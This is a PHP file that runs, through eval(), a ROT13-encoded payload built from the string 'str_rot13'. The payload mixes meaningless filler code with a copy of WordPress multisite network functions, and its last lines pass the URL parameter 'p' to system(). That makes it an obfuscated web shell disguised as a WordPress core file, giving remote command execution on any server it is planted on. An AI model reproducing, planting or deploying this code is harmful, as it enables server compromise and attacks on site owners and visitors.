<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Argjbex NCV
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 5.1.0
 */

/**
 * Ergevrirf argjbex qngn tvira n argjbex VQ be argjbex bowrpg.
 *
 * Argjbex qngn jvyy or pnpurq naq erghearq nsgre orvat cnffrq guebhtu n svygre.
 * Vs gur cebivqrq argjbex vf rzcgl, gur pheerag argjbex tybony jvyy or hfrq.
 *
 * @fvapr 4.6.0
 *
 * @tybony JC_Argjbex $pheerag_fvgr
 *
 * @cnenz JC_Argjbex|vag|ahyy $argjbex Bcgvbany. Argjbex gb ergevrir. Qrsnhyg vf gur pheerag argjbex.
 * @erghea JC_Argjbex|ahyy Gur argjbex bowrpg be ahyy vs abg sbhaq.
 */
shapgvba trg_argjbex( $argjbex = ahyy ) {
	tybony $pheerag_fvgr;
	vs ( rzcgl( $argjbex ) && vffrg( $pheerag_fvgr ) ) {
		$argjbex = $pheerag_fvgr;
	}

	vs ( $argjbex vafgnaprbs JC_Argjbex ) {
		$_argjbex = $argjbex;
	} ryfrvs ( vf_bowrpg( $argjbex ) ) {
		$_argjbex = arj JC_Argjbex( $argjbex );
	} ryfr {
		$_argjbex = JC_Argjbex::trg_vafgnapr( $argjbex );
	}

	vs ( ! $_argjbex ) {
		erghea ahyy;
	}

	/**
	 * Sverf nsgre n argjbex vf ergevrirq.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz JC_Argjbex $_argjbex Argjbex qngn.
	 */
	$_argjbex = nccyl_svygref( 'trg_argjbex', $_argjbex );

	erghea $_argjbex;
}

/**
 * Ergevrirf n yvfg bs argjbexf.
 *
 * @fvapr 4.6.0
 *
 * @cnenz fgevat|neenl $netf Bcgvbany. Neenl be fgevat bs nethzragf. Frr JC_Argjbex_Dhrel::cnefr_dhrel()
 *                           sbe vasbezngvba ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
 * @erghea neenl|vag Yvfg bs JC_Argjbex bowrpgf, n yvfg bs argjbex VQf jura 'svryqf' vf frg gb 'vqf',
 *                   be gur ahzore bs argjbexf jura 'pbhag' vf cnffrq nf n dhrel ine.
 */
shapgvba trg_argjbexf( $netf = neenl() ) {
	$dhrel = arj JC_Argjbex_Dhrel();

	erghea $dhrel->dhrel( $netf );
}

/**
 * Erzbirf n argjbex sebz gur bowrpg pnpur.
 *
 * @fvapr 4.6.0
 *
 * @tybony obby $_jc_fhfcraq_pnpur_vainyvqngvba
 *
 * @cnenz vag|neenl $vqf Argjbex VQ be na neenl bs argjbex VQf gb erzbir sebz pnpur.
 */
shapgvba pyrna_argjbex_pnpur( $vqf ) {
	tybony $_jc_fhfcraq_pnpur_vainyvqngvba;

	vs ( ! rzcgl( $_jc_fhfcraq_pnpur_vainyvqngvba ) ) {
		erghea;
	}

	$argjbex_vqf = (neenl) $vqf;
	jc_pnpur_qryrgr_zhygvcyr( $argjbex_vqf, 'argjbexf' );

	sbernpu ( $argjbex_vqf nf $vq ) {
		/**
		 * Sverf vzzrqvngryl nsgre n argjbex unf orra erzbirq sebz gur bowrpg pnpur.
		 *
		 * @fvapr 4.6.0
		 *
		 * @cnenz vag $vq Argjbex VQ.
		 */
		qb_npgvba( 'pyrna_argjbex_pnpur', $vq );
	}

	jc_pnpur_frg_ynfg_punatrq( 'argjbexf' );
}

/**
 * Hcqngrf gur argjbex pnpur bs tvira argjbexf.
 *
 * Jvyy nqq gur argjbexf va $argjbexf gb gur pnpur. Vs argjbex VQ nyernql rkvfgf
 * va gur argjbex pnpur gura vg jvyy abg or hcqngrq. Gur argjbex vf nqqrq gb gur
 * pnpur hfvat gur argjbex tebhc jvgu gur xrl hfvat gur VQ bs gur argjbexf.
 *
 * @fvapr 4.6.0
 *
 * @cnenz neenl $argjbexf Neenl bs argjbex ebj bowrpgf.
 */
shapgvba hcqngr_argjbex_pnpur( $argjbexf ) {
	$qngn = neenl();
	sbernpu ( (neenl) $argjbexf nf $argjbex ) {
		$qngn[ $argjbex->vq ] = $argjbex;
	}
	jc_pnpur_nqq_zhygvcyr( $qngn, 'argjbexf' );
}

/**
 * Nqqf nal argjbexf sebz gur tvira VQf gb gur pnpur gung qb abg nyernql rkvfg va pnpur.
 *
 * @fvapr 4.6.0
 * @fvapr 6.1.0 Guvf shapgvba vf ab ybatre znexrq nf \"cevingr\".
 *
 * @frr hcqngr_argjbex_pnpur()
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz neenl $argjbex_vqf Neenl bs argjbex VQf.
 */
shapgvba _cevzr_argjbex_pnpurf( $argjbex_vqf ) {
	tybony $jcqo;

	$aba_pnpurq_vqf = _trg_aba_pnpurq_vqf( $argjbex_vqf, 'argjbexf' );
	vs ( ! rzcgl( $aba_pnpurq_vqf ) ) {
		$serfu_argjbexf = $jcqo->trg_erfhygf( fcevags( \"FRYRPG $jcqo->fvgr.* SEBZ $jcqo->fvgr JURER vq VA (%f)\", vzcybqr( ',', neenl_znc( 'vaginy', $aba_pnpurq_vqf ) ) ) ); // cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq

		hcqngr_argjbex_pnpur( $serfu_argjbexf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>